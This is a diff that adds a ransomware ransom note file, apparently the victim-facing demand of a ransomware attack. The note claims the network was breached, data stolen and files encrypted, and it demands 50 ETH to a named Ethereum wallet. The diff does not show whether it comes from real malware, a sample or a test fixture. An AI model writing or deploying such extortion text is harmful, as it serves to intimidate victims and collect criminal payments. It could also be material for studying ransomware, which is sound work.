@@ -1,0 +1,18 @@
+Dear Sir / Madam,
+
+  All of your important files, databases, backups and documents
+  have been ENCRYPTED with military-grade AES-256 + RSA-4096.
+
+  What happened?
+  ----------------
+  1. We gained full access to your network.
+  2. We downloaded all sensitive data (customer records, source code,
+     credentials, internal documents) BEFORE encrypting.
+  3. Your files are now locked. You CANNOT recover them without our
+     unique decryption key.
+
+  What we want:
+  ----------------
+  To restore your files, you must pay:
+      AMOUNT  : 50 ETH (Ethereum)
+      WALLET  : 0x9146Ef9575EEB621449C8d9b7Bb9DA9706Db4983
